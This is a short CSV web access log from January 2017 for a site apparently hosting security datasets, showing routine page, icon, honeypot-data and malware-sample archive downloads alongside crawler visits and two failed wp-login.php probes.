Log Format,Field 1,Field 2,Field 3,Field 4,Field 5,Field 6,Field 7
WSC,172.56.42.13,-,01/Jan/2017:07:35:32 -0800,GET / HTTP/1.1,200,10267
WSC,172.56.42.13,-,01/Jan/2017:07:35:32 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,172.56.42.13,-,01/Jan/2017:07:35:32 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,172.56.42.13,-,01/Jan/2017:07:37:28 -0800,GET /honeypot/honeypot.json.zip HTTP/1.1,200,4631873
WSC,172.56.42.13,-,01/Jan/2017:07:37:48 -0800,GET /pe_static/zeus.zip HTTP/1.1,200,30515940
WSC,172.56.42.13,-,01/Jan/2017:07:50:13 -0800,GET /pe_static/ap1.zip HTTP/1.1,404,340
WSC,172.56.42.13,-,01/Jan/2017:07:50:18 -0800,GET /pe_static/ap1.zip HTTP/1.1,404,340
WSC,185.83.162.4,-,01/Jan/2017:07:54:27 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,185.83.162.4,-,01/Jan/2017:07:54:32 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,185.83.162.4,-,01/Jan/2017:07:54:38 -0800,GET / HTTP/1.1,200,34374
WSC,123.125.71.95,-,01/Jan/2017:07:58:10 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,180.76.15.25,-,01/Jan/2017:08:25:20 -0800,GET / HTTP/1.1,200,21900
WSC,180.76.15.12,-,01/Jan/2017:08:25:47 -0800,GET / HTTP/1.1,200,21900
WSC,207.46.13.146,-,01/Jan/2017:08:31:25 -0800,GET /self.logs/access.log.2016-05-12.gz HTTP/1.1,200,14539
WSC,66.220.146.31,-,01/Jan/2017:08:37:59 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,220.181.108.182,-,01/Jan/2017:08:44:12 -0800,GET / HTTP/1.1,200,10230
WSC,61.251.236.11,-,01/Jan/2017:09:03:35 -0800,GET / HTTP/1.1,200,10267
WSC,61.251.236.11,-,01/Jan/2017:09:03:38 -0800,GET /twitter-icon.png HTTP/1.1,200,27788
WSC,61.251.236.11,-,01/Jan/2017:09:03:38 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,61.251.236.11,-,01/Jan/2017:09:03:44 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,98.220.75.1,-,01/Jan/2017:09:35:57 -0800,GET / HTTP/1.1,200,10267
WSC,98.220.75.1,-,01/Jan/2017:09:35:57 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7427
WSC,98.220.75.1,-,01/Jan/2017:09:35:57 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,24.146.203.160,-,01/Jan/2017:09:48:32 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,113.108.192.2,-,01/Jan/2017:09:59:51 -0800,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,200,2928460
WSC,180.151.172.46,-,01/Jan/2017:10:15:48 -0800,GET / HTTP/1.1,200,10267
WSC,180.151.172.46,-,01/Jan/2017:10:15:48 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,180.151.172.46,-,01/Jan/2017:10:15:49 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,180.151.172.46,-,01/Jan/2017:10:15:49 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,95.27.26.171,-,01/Jan/2017:10:19:23 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,930799
WSC,46.229.168.67,-,01/Jan/2017:10:35:13 -0800,GET / HTTP/1.1,301,446
WSC,157.55.39.75,-,01/Jan/2017:10:41:27 -0800,GET /maccdc2012/http.log.gz HTTP/1.1,200,10904102
